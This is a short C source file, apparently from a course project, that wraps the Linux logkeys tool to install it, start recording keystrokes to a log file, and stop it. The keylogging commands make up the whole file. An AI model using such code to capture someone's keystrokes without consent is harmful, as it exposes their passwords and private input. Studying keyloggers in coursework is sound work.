#include <stdlib.h>

// install the logkeys
void keylogger_init(){
	system("sudo apt-get install logkeys");
}

// create a file to store logged keys and start logging keys
void keylogger_start(){
	system("sudo touch keyPressed.log");
	system("sudo logkeys --start -m /CSE2431_Project/Keylogger/en_US_ubuntu_1204.map  --output keyPressed.log");
}

// save the logged file and kill logkeys
void keylogger_end(){
	system("sudo logkeys --kill");
}
